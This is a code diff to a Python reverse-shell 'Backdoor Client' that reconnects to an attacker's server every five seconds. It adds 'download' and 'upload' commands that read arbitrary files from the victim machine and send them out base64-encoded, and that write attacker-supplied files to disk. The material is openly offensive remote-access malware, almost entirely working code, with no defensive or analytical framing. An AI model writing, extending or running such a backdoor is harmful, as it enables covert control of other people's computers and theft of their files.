@@ -9,6 +9,8 @@ import time
 import os
 import shutil
 import sys
+# To allow sending files from this Backdoor Client to Backdoor Server
+import base64
 
 # Global variables
 sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -36,7 +38,10 @@ def reliable_recv():
         try:
             json_data += sock.recv(1024)
             # If target.recv <= 1024 bytes
-            return json.loads(json_data.decode())
+            decoded_json = json.loads(json_data.decode())
+            #return json.loads(json_data.decode())
+            # type(decoded_json) = str
+            return decoded_json
             
         except ValueError:
             # If we get ValueError
@@ -47,9 +52,9 @@ def reliable_recv():
 # Listen to mouse movement double-clicks to re-connect
 def connection():
     while True:
-        # Our Backdoor will sleep for 20 seconds
+        # Our Backdoor will sleep for 5 seconds
         # then it will perform next operation
-        time.sleep(20)
+        time.sleep(5)
         try:
             # Connecting to Backdoor Server
             sock.connect((IP_ADDRESS, port))
@@ -76,7 +81,7 @@ def shell():
             break
             # continue to sock.close()
         
-        # If we wanna change directory
+        # 'cd' command
         # The cd command first 2 CHAR = cd
         # If we wanna cd to somewhere else, command.length must > 1
         elif command[:2].strip() == 'cd' and len(command.strip()) > 1:
@@ -90,6 +95,33 @@ def shell():
             # except Exception as e:
             #     cd_error = f'[!!] Cannot cd to this PATH: {str(e)}'
             #     continue
+            
+        # 'download' command
+        # For Downloading files from Backdoor Client => Backdoor Server
+        # filePath starts from 9th CHAR 'download '
+        # read binary data from files       
+            # Start reading from first 9 CHAR as fileName
+            # Encode file with ascii before sending
+        elif command[:8].strip() == 'download':
+            file_path = command[9:].strip()
+            if os.path.exists(file_path):
+                #with open(command[9:].strip(), 'rb') as file:
+                with open(file_path, 'rb') as file:
+                    # type(file) = _io.BufferedReader
+                    file_read = file.read()
+                    # type(file_read) = byte
+                    file_b64encode = base64.b64encode(file_read)
+                    # type(file_b64encode) = byte
+                    reliable_send(file_b64encode)
+        
+        # 'upload' command
+        elif command[:6].strip() == 'upload':
+            #with open(command[7:].strip(), 'wb') as fin:
+            with open(command[7:], 'wb') as fin:
+                result = reliable_recv()
+                result_b64decode = base64.b64decode(result)
+                fin.write(result_b64decode)
+                        
         else:
             try:
                 #message_back = input(f'Type Message to send to Server: ')
